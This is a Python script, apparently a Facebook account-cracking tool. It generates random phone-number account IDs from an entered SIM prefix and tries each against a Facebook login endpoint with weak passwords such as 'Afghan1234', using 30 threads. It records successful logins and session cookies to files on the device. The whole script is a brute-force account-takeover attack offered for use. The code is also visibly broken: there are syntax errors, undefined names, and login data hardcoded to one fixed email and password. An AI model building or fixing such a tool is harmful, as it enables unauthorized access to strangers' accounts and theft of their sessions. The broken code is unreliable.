#WRITTEN BY Farhad Badakhsh 
#FOLLOW : https://github.com/FarhadBadakhsh
#------------- import -------------#
import os
from os import system as clr
import random
import string 
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import re
import sys
import uuid
import json
#-------------color----------------#
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"        # Yellow
bblue="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
my_color = [
 B,C,P,H]
warna = random.choice(my_color)
oks=[]
cps=[]
loop=0
#-------------logo-----------------#
logo=(f'''{B}\033[1;99m
\033[1;96m________ __ __       
/ | / | / |      
$$$$$$$$/______ ______ $$ |____ ______ ____$$ |      
$$ |__ / \ / \ $$ \ / \ / $$ |      
$$ | $$$$$$ |/$$$$$$ |$$$$$$$ | $$$$$$ |/$$$$$$$ |      
$$$$$/ / $$ |$$ | $$/ $$ | $$ | / $$ |$$ | $$ |      
$$ | /$$$$$$$ |$$ | $$ | $$ |/$$$$$$$ |$$ \__$$ |      
$$ | $$ $$ |$$ | $$ | $$ |$$ $$ |$$ $$ |      
$$/ $$$$$$$/ $$/ $$/ $$/ $$$$$$$/ $$$$$$$/                                                                                                                                                                                      v_0.1
{warna}--------------------------------------------{B}
 Owner    : Farhad Badakhsh 
 Guthub   : FarhadBadakhsh 
 Facebook : Farhad Badakhsh 
 Tools    : 0.1
--------------------------------------------{B}''')
#-------------linex def -------------#
def linex():
    print(f'{warna}--------------------------------------------{B}')
#-------------clear def -------------#
def clear():
    clr('clear')
    print(logo)
#-------------main def------------#
def Farhad Badakhsh():
    clear()
    os.system('xdg-open https://t.me/AfganHack13')
    print(f'{B} [{warna}1{B}] RANDOM CLONING AFG ')
    print(f'{B} [{warna}0{B}] EXIT FROM COMMAND')
    linex()
    option=input(f' {B}[{warna}??{B}] CHOICE MENU >> ')
    if option in ['01','1']:
        AFG_CLONING()
    else:
        exit(' Thanks for using dear :)')
#------------- AFG clone def ----------#
def AFG_CLONING():
    user=[]
    clear()
    print(' EXAMPLE SIM CODE : 9370,9378,9377...')
    code=input(' ENTER SIM CODE >> ')
    linex()
    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
    try:
        limit=int(input(' ENTER LIMIT >> '))
    except ValueError:
        limit=50000
    clear()
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as Haqani:
        tl=str(len(user))
        print(' TOTAL ACCOUNT : '+tl)
        print(' YOUR SIM CODE : '+code)
        print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
        linex()
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,'۱۲۳۴۵۶','Afghan1234','Afghan12345']
            Haqani.submit(method_crack,ids,passlist)
    linex()
    print(' THE PROGRESS HAS BEEN COMPLETE ')
    print(' TOTAL OK ID '+str(len(oks)))
    print(' TOTAL CP ID '+str(len(cps)))
    input(' PRESS ENTER TO BACK  : ')
    MR_Haqani()
#------------ method crack def ---------#
def method_crack(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[started] %s|\033[1;32m🥀succes🥀:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={'email': '03101497867',
                        'password': 'pakistan',
                        'cpl': 'true',
                        'credentials_type': 'password',
                        'error_detail_type': 'button_with_disabled',
                        'source': 'login',
                        'format': 'json',
                        'generate_session_cookies': '1',
                        'generate_analytics_claim': '1',
                        'generate_machine_id': '1'}
            headers = {'authority': 'x.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',             
            'dpr': '2',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"TECNO BF7"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"12.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            'viewport-width': '980',
}
            url='https://x.facebook.com/m.alpha.140/',
            reqx=requests.post(url,data=datax,headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                if str(uid) in oks:
                    break
                else:
                    print('\r\r \033[1;32m[Farhad-OK🥀] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    open('/sdcard/Farhad-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;37m[Farhad-CP😅] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/Farhad-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#-------------end----------------#
MR_Haqani()